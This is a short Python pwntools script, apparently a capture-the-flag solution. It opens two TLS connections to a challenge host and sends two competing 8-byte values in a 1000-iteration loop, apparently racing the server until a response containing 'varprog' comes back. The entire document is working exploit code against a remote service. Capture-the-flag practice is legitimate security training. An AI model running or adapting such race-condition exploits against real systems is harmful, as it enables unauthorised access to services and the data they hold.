from pwn import *

p = remote('inst-ke8w2xkhfh.tls.vuln.si', 443, ssl=True)
p2 = remote('inst-ke8w2xkhfh.tls.vuln.si', 443, ssl=True)

for i in range(1000):
    p.send(p64(0x1337c0de))
    p2.send(p64(0xdeadc0de))

    line = p.recvline()
    if b'varprog' in line:
        print(line)
        break
